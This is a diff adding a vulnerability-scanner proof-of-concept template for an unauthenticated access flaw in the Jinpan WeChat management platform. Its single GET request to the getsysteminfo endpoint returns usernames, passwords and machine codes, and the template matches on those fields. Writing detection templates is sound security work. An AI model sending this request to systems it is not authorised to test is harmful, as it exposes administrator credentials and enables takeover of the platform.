@@ -1,0 +1,17 @@
+id: jp-wechatmanager-unauth
+
+info:
+  name: 金盘 微信管理平台 getsysteminfo 未授权访问漏洞
+  author: peiqi
+  severity: high
+  verified: true
+  description: |
+    金盘 微信管理平台 getsysteminfo接口存在未授权访问漏洞，攻击者通过漏洞可以获取账号密码信息，获取后台管理员权限
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /admin/weichatcfg/getsysteminfo
+    expression: response.status == 200 && response.body.bcontains(b'username') && response.body.bcontains(b'password') && response.body.bcontains(b'username') && response.body.bcontains(b'machinecode')
+expression: r0()
